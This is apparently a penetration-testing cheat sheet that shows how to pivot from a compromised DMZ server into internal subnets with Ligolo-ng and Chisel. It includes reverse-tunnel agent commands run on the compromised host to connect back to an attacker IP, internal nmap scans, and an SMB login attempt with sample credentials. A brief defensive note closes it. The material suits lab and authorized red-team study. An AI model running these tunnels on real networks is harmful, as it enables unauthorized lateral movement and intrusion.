# Chisel & Ligolo-ng — Pivoting & Tunneling into Internal Networks

> **TL;DR:** Compromising a dual-homed DMZ server lets you pivot into hidden internal subnets (`172.16.10.0/24`) that your Kali machine cannot reach directly. **Chisel** creates fast SOCKS5 tunnels over HTTP; **Ligolo-ng** creates a native TUN interface (`ligolo`) so you can run `nmap` and `impacket-*` without `proxychains4`!

---

## Installation in Kali Linux
```bash
sudo apt install -y chisel ligolo-ng
```

---

## 1. Ligolo-ng (Modern Preferred Method — No `proxychains` Needed)

Ligolo-ng turns your pivot host into a virtual network interface (`ligolo`) on Kali.

### Step 1: On Kali (Attacker)
```bash
# 1. Create the virtual TUN interface
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# 2. Start the Ligolo proxy server (self-signed cert for labs)
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
```

### Step 2: On Compromised Pivot Host
Transfer the `agent` binary (`agent` for Linux or `agent.exe` for Windows) and connect back to Kali:
```bash
./agent -connect 10.10.14.5:11601 -ignore-cert
```

### Step 3: Route Internal Subnet on Kali
In the `ligolo-proxy` prompt:
```text
ligolo-ng » session          # Select the connected agent
ligolo-ng » ifconfig         # View internal subnets on the pivot host (e.g., 172.16.10.0/24)
ligolo-ng » start            # Start the tunnel
```
In a second Kali terminal, add the route:
```bash
sudo ip route add 172.16.10.0/24 dev ligolo
# Now scan internal hosts directly!
nmap -sS -Pn 172.16.10.5
```

---

## 2. Chisel — Fast SOCKS5 Proxy Over HTTP

Great when TUN interfaces aren't available or you only need a quick SOCKS5 proxy for `proxychains4`.

### Step 1: Start Chisel Server on Kali
```bash
chisel server -p 8000 --reverse
```

### Step 2: Connect Chisel Client from Pivot Host
```bash
./chisel client 10.10.14.5:8000 R:socks
```
*(Creates a SOCKS5 listener on Kali `127.0.0.1:1080`.)*

### Step 3: Route Kali Tools Through `/etc/proxychains4.conf`
Ensure `/etc/proxychains4.conf` ends with `socks5 127.0.0.1 1080`, then run:
```bash
proxychains4 -q nmap -sT -Pn 172.16.10.5
proxychains4 -q nxc smb 172.16.10.5 -u admin -p 'Pass123!'
```

---

## Common Pitfalls & Defensive Notes
- **Using `nmap -sS` Through `proxychains4`:** SOCKS proxies only forward full TCP connections (`-sT`), never raw SYN packets (`-sS`). Always use `-sT -Pn` with `proxychains4` (or use Ligolo-ng!).
- **Defensive Tip:** Segment DMZ servers from internal corporate/AD subnets using strict firewall rules, and alert on unexpected outbound connections on non-standard ports (`11601`, `8000`) or long-lived single-TCP tunnels.
